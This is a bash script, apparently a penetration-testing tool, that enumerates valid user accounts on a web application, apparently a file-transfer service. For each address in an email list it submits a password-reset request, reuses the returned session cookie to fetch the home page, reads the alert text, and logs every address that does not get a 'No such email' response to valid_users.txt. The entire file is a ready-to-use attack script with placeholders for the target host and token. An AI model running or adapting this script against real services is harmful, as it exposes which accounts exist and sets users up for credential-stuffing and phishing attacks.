#!/bin/bash

# Prompt for the input file
read -p "Enter path to email list file: " email_file

if [[ ! -f "$email_file" ]]; then
  echo "File not found: $email_file"
  exit 1
fi

# Config
RESET_URL="https://<ENTER_HOST_HERE>/password_reset"
GET_URL="https://<ENTER_HOST_HERE>/"
TOKEN="<AUTHENTICITY_TOKEN_HERER>"
BASE_COOKIE="<_filetransfer_session_value_first_request>"

while IFS= read -r email; do
  echo "[*] Processing $email"

  # STEP 1: POST /password_reset
  response=$(curl -x http://127.0.0.1:8080 -sk -i -X POST "$RESET_URL" \
    -H "Host: <ENTER_HOST_HERE>" \
    -H "Cookie: _filetransfer_session=$BASE_COOKIE" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-urlencode "authenticity_token=$TOKEN" \
    --data-urlencode "user[email]=$email" \
    --data-urlencode "button=")

  # Extract new session cookie
  session_cookie=$(echo "$response" | grep -i 'Set-Cookie: _filetransfer_session=' | sed -E 's/.*_filetransfer_session=([^;]+);.*/\1/I')

  if [[ -z "$session_cookie" ]]; then
    echo "[-] No session cookie received for $email"
    echo "--------------------------------------"
    continue
  fi

  echo "[+] New session cookie: $session_cookie"

  # STEP 2: GET /
  get_response=$(curl -x http://127.0.0.1:8080 -sk -X GET "$GET_URL" \
    -H "Cookie: _filetransfer_session=$session_cookie")

  # Extract alert message
  alert_message=$(echo "$get_response" | xmllint --html --xpath \
  'string(//div[contains(@class, "alert") and contains(@class, "alert-dismissible") and not(contains(@class, "d-none"))])' - 2>/dev/null | sed -E 's/^[[:space:]]+|[[:space:]]+$//g')

if [[ -n "$alert_message" ]]; then
  echo "[!] Alert for $email: $alert_message"

  # Check if it's NOT the invalid message
  if [[ "$alert_message" != *"No such email"* ]]; then
    echo "$email" >> valid_users.txt
    echo "[+] Exported to valid_users.txt"
  fi
else
  echo "[~] No visible alert for $email"
fi

echo "--------------------------------------"

done < "$email_file"
